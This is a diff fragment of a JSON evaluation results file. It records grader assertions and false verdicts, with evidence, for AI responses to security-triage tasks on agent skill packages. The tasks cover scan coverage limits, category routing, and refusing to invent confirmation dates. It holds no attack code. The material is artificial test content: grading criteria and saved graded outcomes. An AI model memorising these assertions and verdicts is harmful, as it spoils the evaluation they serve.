+        "assertion_index": 1,
+        "text": "The response names at least one question about this skill that reading these bytes cannot answer — for example what the package looked like on the platform it was ported from, or how it behaves under a different host's default permission model — instead of leaving an unqualified 'safe to install' as the whole verdict.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response gives no unanswered question about the skill (e.g., platform differences or permission models); it simply declares it safe."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not pose any question about unknown aspects of the skill; it gives an unqualified safe verdict without raising a question."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-2",
+        "assertion_index": 2,
+        "text": "The response qualifies what the content-layer scan did not cover — for example a bounded decode depth, encodings that are never extracted as candidates, or the point that blobs read is not the same number as payloads present — instead of reporting the scan as exhaustive.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention any scan limitations (e.g., bounded decode depth, missed encodings, blob vs payload count) and reports the content‑layer check as decisive."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not discuss scan limitations such as bounded decode depth or missed encodings; it simply states the scan found a vulnerability."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response states that encoding is not itself the finding, and gives the condition that makes it one: decoded content matching a payload behaviour, or a decoded literal reaching an execution sink.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never states that encoding is not itself the finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response never states that encoding alone is not a finding nor gives the condition (decoded content matching payload or reaching execution sink)."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response reports what the content scan actually examined rather than treating its silence as coverage — for example the bounded decode depth and per-blob size limit, or that only certain encodings are extracted as candidates so base32, base85 or a custom alphabet is never decoded at all.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It mentions scanner limitations but does not describe bounded decode depth, per‑blob size limits, or that only certain encodings are extracted (e.g., base32/base85)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention bounded decode depth, size limits, or selective encoding extraction (e.g., base32/base85)."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response records the manifest's shell: false beside a bundled script calling os.system as a separate misdeclaration finding belonging to AST04, rather than as a second AST10 finding or as part of this one.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The issue is labeled AST10‑S06; the response does not record the shell:false misdeclaration as a separate AST04 finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response notes shell: false but does not record it as a separate AST04 misdeclaration finding."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-regression-case-1",
+        "assertion_index": 4,
+        "text": "The response declines to read the manifest validator's exit 0 as evidence that nothing was stripped in the port, on the ground that the signals which most directly mark a port are warnings rather than errors and the default exit code discards them.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It notes validators returned OK but does not decline to treat exit 0 as evidence or cite warnings vs errors as the relevant signal."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response rejects treating exit 0 as proof of nothing stripped but gives no rationale about warnings versus errors."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-1",
+        "assertion_index": 4,
+        "text": "The response states the condition under which AST08 would instead be the origin: when the scanner, its coverage claim, or a scan result is itself the thing under review.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "AST08 cannot be the origin here unless the artifact under review *is the scanner itself*."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state the condition when AST08 would be the origin."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-1",
+        "assertion_index": 5,
+        "text": "The response states that it has not opened or inspected any package, and that routing decides which category owns the finding and not whether the finding is true.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no statement that it has not opened or inspected any package, nor that routing decides ownership rather than truth."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It never says it has not inspected a package or that routing decides ownership."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-2",
+        "assertion_index": 3,
+        "text": "The response warns against closing or parking the ticket pending a scan, and routes the hand-off to a named human process such as revocation wired into offboarding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not warn against parking the ticket nor route hand‑off to a revocation/offboarding process; hand‑off target is a file path."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no warning about closing/parking the ticket nor reference to revocation or off‑boarding process."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-3",
+        "assertion_index": 3,
+        "text": "If the response names an AST category at all, it labels it as where to look or what to audit against rather than as a decided classification for this package.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It states \"the applicable category is clearly AST10 (Portability)\" and \"The package belongs in the AST10 queue,\" which is a decided classification."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It names the category as a definitive classification: \"belongs to AST10‑S06\"."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-3",
+        "assertion_index": 4,
+        "text": "The response distinguishes what routing decides (which category owns a finding) from what it does not decide (whether the finding is true), and states that it has not decided the latter.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not separate routing decisions from truth of the finding; it does not state it has not decided whether the finding is true."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not separate routing decisions from truth of the finding; it provides a classification and no such distinction."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-control-case-1",
+        "assertion_index": 1,
+        "text": "The response refuses to supply a date by which a scan will confirm the finding, and gives the reason that nothing in triage opens the package, so 'routed to' is the strongest claim available.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention triage opening the package or that 'routed to' is the strongest claim; it only says no scan can confirm."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response provides a Confirmation Date (2023-10-21) and gives no reason about triage limitations."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-control-case-1",
+        "assertion_index": 2,
+        "text": "The response states that neither the origin nor the contributing category has a check that could confirm this finding — maintainer account takeover is not decidable from a package, and AST07 ships no detector and no F1 — so the hand-off is to a named person and process rather than to a scan queue.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response notes AST02 lacks a detector but does not state that AST07 ships no detector or no F1, though it does give a hand‑off to a team."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not discuss lack of checks, maintainer takeover, or AST07; it assigns a queue."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-control-case-1",
+        "assertion_index": 3,
+        "text": "The response declines the tracker's two closure options instead of choosing the nearer one, and says a ticket closed pending a scan that will never run is worse than an open ticket.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says the ticket cannot be closed as 'confirmed' or 'false positive' via a scan, but does not explicitly claim that closing pending a never‑run scan is worse than leaving it open."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response chooses the 'confirmed' closure option instead of declining both."
+          ]
+        }
+      }
+    ],
+    "mixed_across_repeats": [],
+    "incomplete": []
+  }
+}
